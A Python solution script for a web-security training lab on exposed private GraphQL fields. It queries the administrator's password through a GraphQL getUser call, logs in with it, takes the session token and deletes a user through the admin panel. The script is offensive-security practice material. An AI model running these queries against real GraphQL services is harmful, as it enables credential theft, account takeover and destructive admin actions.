#######################################################
#
# Lab: Accidental exposure of private GraphQL fields
#
# Hack Steps:
#      1. Query the hidden post
#      2. Extract administrator's password
#      3. Login as administrator
#      4. Extract administrator's token
#      5. Delete carlos from the admin panel
#
#######################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aca00fe04c220548040537a004b00a6.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Querying the hidden post.. ", end="", flush=True)

    query = """query getBlogSummaries {
                    getUser(id: 1) {
                        password
                    }
                }"""
    json = {  "query": query , "operationName": "getBlogSummaries" }
    query_result = post_data("/graphql/v1", json)        

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting administrator's password.. ", end="", flush=True)

    admin_password = re.findall("\"password\": \"(\w*)\"", query_result.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗3⦘ Logging in as administrator.. ", end="", flush=True)        

    mutation = f"""mutation login {{
                            login(input: {{ username: "administrator", password: "{admin_password}" }}) {{
                                token
                                success
                            }}
                        }}"""
    json =  { "query": mutation, "operationName": "login" }
    admin_login = post_data("/graphql/v1", json)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting administrator's token.. ", end="", flush=True)

    admin_token = re.findall("\"token\": \"(\w*)\"", admin_login.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_token)
    print(Fore.WHITE + "⦗5⦘ Deleting carlos from the admin panel.. ", end="", flush=True)

    cookies = { "session": admin_token }
    fetch("/admin/delete?username=carlos", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(path, json = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", json=json, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)        
        
if __name__ == "__main__":
    main()

